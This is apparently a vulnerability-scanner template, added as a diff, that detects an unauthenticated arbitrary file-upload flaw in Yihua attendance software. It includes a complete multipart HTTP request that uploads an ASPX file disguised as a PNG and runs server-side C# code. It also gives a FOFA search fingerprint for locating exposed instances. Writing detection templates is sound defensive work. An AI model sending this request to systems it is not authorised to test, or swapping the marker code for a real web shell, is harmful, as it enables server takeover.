@@ -1,0 +1,64 @@
+http:
+    - raw:
+        - |
+          POST /filemanage/file/default.aspx HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
+          Content-Type: multipart/form-data; boundary=----geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
+
+          ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
+          Content-Disposition: form-data; name="__VIEWSTATE"
+
+          /wEPDwULLTEzNjk1NjQwNjYPZBYCAgMPZBYGAgEPDxYCHgRUZXh0BQ0vRmlsZXNVcGxvYWQvZGQCAw8PFgIeB1Zpc2libGVoZGQCBA8PFgIfAWhkZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUIQXV0b05hbWW+hnIUyETD/5rHrLALRN1Nkm8eKsAOC0ToDPaGHqsOmg==
+          ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
+          Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
+
+          5338F018
+          ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
+          Content-Disposition: form-data; name="fileToUpload"; filename="{{username}}.aspx"
+          Content-Type: image/png
+
+          <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+          ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
+          Content-Disposition: form-data; name="UploadBtn"
+
+          上传文件
+          ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
+          Content-Disposition: form-data; name="NewFileText"
+
+
+          ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
+          Content-Disposition: form-data; name="NewFolderText"
+
+
+          ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
+          Content-Disposition: form-data; name="setRootTxt"
+
+
+          ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37--
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - pboyjnnrfipmplsukdeczudsefxmywe
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /FilesUpload/{{username}}.aspx HTTP/1.1
+          Host: {{Hostname}}
+id: Yihua-Attendance-Software-default_aspx-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: app="EUESOFT-考勤软件"
+        亿华考勤软件 default.aspx 接口存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: 亿华考勤软件 default.aspx 任意文件上传漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/HmB4DJ1FmK9sHdJH12T8FA
+    severity: high
+    tags: []
+variables:
+    username: '{{to_lower(rand_base(6))}}'
